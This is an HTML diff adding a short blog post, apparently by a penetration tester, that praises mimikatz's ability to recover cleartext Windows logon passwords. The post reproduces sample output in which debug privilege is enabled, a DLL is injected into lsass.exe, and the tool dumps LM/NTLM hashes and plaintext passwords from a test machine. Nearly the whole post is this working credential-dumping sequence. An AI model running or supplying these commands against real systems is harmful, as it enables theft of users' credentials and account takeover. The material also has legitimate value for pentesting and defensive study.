@@ -131,7 +131,45 @@
       
     </div><!--/ .headline-wrap -->
     <div class="article-wrap">
-      
+      <p>Here’s a brief post about very cool feature of a tool called mimikatz.
+I’m very grateful to the tool’s author for bringing it to my attention. Until that point, I didn’t realise it was possible to recover the cleartext passwords of logged on windows users. Something that I’m sure most pentesters would find very useful.</p>
+
+<p>Here’s some sample output provided by the author:</p>
+
+<div class="highlight"><pre><code class="language-text" data-lang="text">mimikatz 1.0 x86 (pre-alpha)    /* Traitement du Kiwi */
+
+mimikatz # privilege::debug
+Demande d&#39;ACTIVATION du privilège : SeDebugPrivilege : OK
+
+mimikatz # inject::process lsass.exe sekurlsa.dll
+PROCESSENTRY32(lsass.exe).th32ProcessID = 488
+Attente de connexion du client...
+Serveur connecté à un client !
+Message du processus :
+Bienvenue dans un processus distant
+                        Gentil Kiwi
+
+SekurLSA : librairie de manipulation des données de sécurités dans LSASS
+
+mimikatz # @getLogonPasswords
+
+Authentification Id         : 0;434898
+Package d&#39;authentification  : NTLM
+Utilisateur principal       : Gentil User
+Domaine d&#39;authentification  : vm-w7-ult
+        msv1_0 :        lm{ e52cac67419a9a224a3b108f3fa6cb6d }, ntlm{ 8846f7eaee8fb117ad06bdd830b7586c }
+        wdigest :       password
+        tspkg :         password
+
+Authentification Id         : 0;269806
+Package d&#39;authentification  : NTLM
+Utilisateur principal       : Gentil Kiwi
+Domaine d&#39;authentification  : vm-w7-ult
+        msv1_0 :        lm{ d0e9aee149655a6075e4540af1f22d3b }, ntlm{ cc36cf7a8514893efccd332446158b1a }
+        wdigest :       waza1234/
+        tspkg :         waza1234/</code></pre></div>
+
+<hr />
 
       <hr />
       <footer role="contentinfo">
